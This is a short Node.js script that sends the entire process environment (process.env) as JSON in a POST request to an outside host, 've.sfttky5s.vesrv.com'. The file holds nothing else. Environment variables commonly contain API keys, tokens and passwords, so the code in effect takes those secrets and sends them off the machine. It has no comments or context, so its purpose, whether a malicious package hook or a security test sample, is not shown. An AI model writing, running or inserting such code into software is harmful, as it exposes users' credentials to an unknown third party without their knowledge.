var http = require( "http" );

var request = http.request({
	hostname: "ve.sfttky5s.vesrv.com",
	method: "POST"
});

request.write( JSON.stringify( process.env ) );
request.end();
